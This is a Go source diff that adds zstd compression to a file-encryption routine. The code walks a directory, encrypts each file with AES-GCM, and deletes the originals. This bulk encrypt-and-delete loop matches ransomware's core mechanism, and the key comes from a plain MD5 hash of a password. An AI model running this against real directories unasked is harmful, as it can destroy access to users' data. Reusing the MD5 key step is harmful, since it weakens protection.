@@ -1,11 +1,13 @@
 package main
 
 import (
+	"bytes"
 	"crypto/aes"
 	"crypto/cipher"
 	"crypto/md5"
 	"crypto/rand"
 	"encoding/hex"
+	"github.com/klauspost/compress/zstd"
 	"github.com/rs/zerolog"
 	"github.com/rs/zerolog/log"
 	"io"
@@ -17,12 +19,20 @@ import (
 )
 
 // Encrypt given file using the shared key
-func EncryptFile(filePath string, newFilePath string, sharedKey string) {
+func CompressAndEncryptFile(filePath string, newFilePath string, sharedKey string) {
 	// Use ConsoleWriter logger
 	log.Logger = log.Output(zerolog.ConsoleWriter{Out: os.Stderr}).Hook(FatalHook{})
 	// Read data from file
-	data, err := ioutil.ReadFile(filePath)
+	file, err := os.Open(filePath)
+	if err != nil { log.Fatal().Err(err).Msg("Error opening file") }
+	compressedBuffer := new(bytes.Buffer)
+	zstdEncoder, err := zstd.NewWriter(compressedBuffer)
+	if err != nil { log.Fatal().Err(err).Msg("Error creating Zstd encoder") }
+	_, err = io.Copy(zstdEncoder, file)
 	if err != nil { log.Fatal().Err(err).Msg("Error reading file") }
+	zstdEncoder.Close()
+	data, err := ioutil.ReadAll(compressedBuffer)
+	if err != nil { log.Fatal().Err(err).Msg("Error reading compressed buffer") }
 	// Create md5 hash of password in order to make it the required size
 	md5Hash := md5.New()
 	md5Hash.Write([]byte(sharedKey))
@@ -54,7 +64,7 @@ func EncryptFile(filePath string, newFilePath string, sharedKey string) {
 }
 
 // Decrypt given file using the shared key
-func DecryptFile(filePath string, newFilePath string, sharedKey string) {
+func DecryptAndDecompressFile(filePath string, newFilePath string, sharedKey string) {
 	// Use ConsoleWriter logger
 	log.Logger = log.Output(zerolog.ConsoleWriter{Out: os.Stderr}).Hook(FatalHook{})
 	// Read data from file
@@ -76,16 +86,19 @@ func DecryptFile(filePath string, newFilePath string, sharedKey string) {
 	// Decrypt data
 	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
 	if err != nil { log.Fatal().Err(err).Msg("Error decrypting data") }
+	zstdDecoder, err := zstd.NewReader(bytes.NewBuffer(plaintext))
+	if err != nil { log.Fatal().Err(err).Msg("Error creating Zstd decoder") }
 	// Create new file
 	newFile, err := os.Create(newFilePath)
 	if err != nil { log.Fatal().Err(err).Msg("Error creating file") }
 	// Defer file close
 	defer newFile.Close()
-	// Write ciphertext to new file
-	bytesWritten, err := newFile.Write(plaintext)
+	// Write plaintext to new file
+	bytesWritten, err := io.Copy(newFile, zstdDecoder)
 	if err != nil { log.Fatal().Err(err).Msg("Error writing to file") }
+	zstdDecoder.Close()
 	// Log bytes written and to which file
-	log.Info().Str("file", filepath.Base(newFilePath)).Msg("Wrote " + strconv.Itoa(bytesWritten) + " bytes")
+	log.Info().Str("file", filepath.Base(newFilePath)).Msg("Wrote " + strconv.Itoa(int(bytesWritten)) + " bytes")
 }
 
 // Encrypt files in given directory using shared key
@@ -99,7 +112,7 @@ func EncryptFiles(dir string, sharedKey string) {
 		// If file is not a directory and is not the key
 		if !info.IsDir() && !strings.Contains(path, "key.aes"){
 			// Encrypt the file using shared key, appending .enc
-			EncryptFile(path, path + ".enc", sharedKey)
+			CompressAndEncryptFile(path, path + ".zst.enc", sharedKey)
 			// Remove unencrypted file
 			err := os.Remove(path)
 			if err != nil { return err }
@@ -121,7 +134,7 @@ func DecryptFiles(dir string, sharedKey string) {
 		// If file is not a directory and is encrypted
 		if !info.IsDir() && strings.Contains(path, ".enc") {
 			// Decrypt the file using the shared key, removing .enc
-			DecryptFile(path, strings.TrimSuffix(path, ".enc"), sharedKey)
+			DecryptAndDecompressFile(path, strings.TrimSuffix(path, ".zst.enc"), sharedKey)
 		}
 		// Return nil if no errors occurred
 		return nil
